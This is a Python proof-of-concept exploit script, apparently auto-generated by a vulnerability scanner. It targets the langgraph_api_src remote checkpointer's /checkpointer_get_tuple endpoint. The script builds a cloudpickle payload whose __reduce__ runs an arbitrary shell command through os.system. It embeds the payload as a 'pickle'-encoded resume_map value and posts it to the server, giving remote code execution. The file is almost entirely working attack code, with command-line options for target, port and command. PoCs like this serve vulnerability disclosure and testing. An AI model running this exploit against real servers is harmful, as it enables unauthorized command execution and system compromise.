#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: rce-001
# Sink: loads_typed
# Auto-generated — run with: python3 rce_serialized_proto_function_loads_typed.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src remote checkpointer.

Vulnerability: Unsafe deserialization of pickled data via cloudpickle.loads()
in serialized_value_from_proto -> loads_typed path.

The remote checkpointer HTTP server (Starlette) listens on a configurable port
(default 8123) and exposes endpoints like /checkpointer_get_tuple that accept
JSON payloads. These payloads flow through to cloudpickle.loads() with pickle
fallback enabled by default, allowing arbitrary code execution.

Usage:
    python3 exploit.py [--target TARGET] [--port PORT] [--cmd COMMAND]

Example:
    python3 exploit.py --target 127.0.0.1 --port 8123 --cmd "id > /tmp/pwned.txt"
"""

import argparse
import base64
import cloudpickle
import os
import requests
import sys
import time


def build_pickle_payload(command: str) -> str:
    """
    Build a malicious pickle payload that executes the given command.
    
    Uses cloudpickle to serialize a simple object that runs the command
    via os.system() when deserialized.
    """
    class RCE:
        def __reduce__(self):
            return (os.system, (command,))
    
    payload = cloudpickle.dumps(RCE())
    return base64.b64encode(payload).decode()


def exploit(target: str, port: int, command: str, timeout: int = 10):
    """
    Send the malicious pickle payload to the vulnerable endpoint.
    
    The payload is embedded in the 'config' field of the JSON body sent to
    /checkpointer_get_tuple. The config field eventually reaches
    serialized_value_from_proto which calls cloudpickle.loads() on the data.
    """
    url = f"http://{target}:{port}/checkpointer_get_tuple"
    
    # Build the malicious pickle payload
    b64_payload = build_pickle_payload(command)
    
    # The payload needs to be in a format that will be deserialized as pickle.
    # Looking at the code path:
    # 1. config_from_proto processes extra_json fields
    # 2. _configurable_from_proto processes extra_configurable_json fields
    # 3. serialized_value_from_proto is called on values in resume_map
    #
    # The simplest path is through extra_json which gets deserialized via
    # orjson.loads() - that's safe. But extra_configurable_json also goes
    # through orjson.loads().
    #
    # However, the resume_map values go through serialized_value_from_proto
    # which calls loads_typed with the encoding and value. If we can get
    # a value with encoding 'pickle' into the resume_map, it will be
    # deserialized via cloudpickle.loads().
    #
    # The config proto has a resume_map field that accepts string keys and
    # Value proto values. The Value proto has 'encoding' and 'value' fields.
    # We need to craft a config that contains a resume_map entry with
    # encoding='pickle' and value=our_payload.
    #
    # Since we're sending JSON to the HTTP endpoint, we need to understand
    # how the JSON gets converted to the protobuf. Looking at the code:
    # - The payload is parsed as JSON
    # - config is passed to aget_tuple
    # - aget_tuple calls config_to_proto(config)
    # - config_to_proto converts the dict to a protobuf Config
    #
    # The config_to_proto function in config.py handles:
    # - thread_id, checkpoint_id, checkpoint_ns, etc.
    # - extra_json: dict of string -> any (serialized as JSON)
    # - extra_configurable_json: dict of string -> any (serialized as JSON)
    # - resume_map: dict of string -> Value proto
    #
    # For resume_map, the Value proto has 'encoding' and 'value' fields.
    # In the JSON representation, this would be:
    # {"resume_map": {"key": {"encoding": "pickle", "value": "<base64_payload>"}}}
    
    payload = {
        "config": {
            "resume_map": {
                "exploit": {
                    "encoding": "pickle",
                    "value": b64_payload
                }
            }
        }
    }
    
    print(f"[*] Target: {url}")
    print(f"[*] Command: {command}")
    print(f"[*] Payload size: {len(b64_payload)} bytes")
    
    try:
        response = requests.post(url, json=payload, timeout=timeout)
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        if response.status_code == 200:
            print("[+] Exploit sent successfully!")
            print("[*] Check if the command was executed on the target.")
        elif response.status_code == 500:
            print("[*] Server error - this is expected if the command executed")
            print("    but the response processing failed (which is fine for RCE)")
        else:
            print(f"[!] Unexpected status code: {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection refused to {url}")
        print("    Make sure the target server is running and the port is correct.")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"[-] Connection timed out to {url}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for langgraph_api_src remote checkpointer RCE"
    )
    parser.add_argument(
        "--target",
        default="127.0.0.1",
        help="Target host (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=8123,
        help="Target port (default: 8123)"
    )
    parser.add_argument(
        "--cmd",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    
    args = parser.parse_args()
    
    print("[*] langgraph_api_src Remote Checkpointer RCE PoC")
    print("[*] " + "=" * 50)
    
    exploit(args.target, args.port, args.cmd, args.timeout)
    
    print("[*] Done.")


if __name__ == "__main__":
    main()
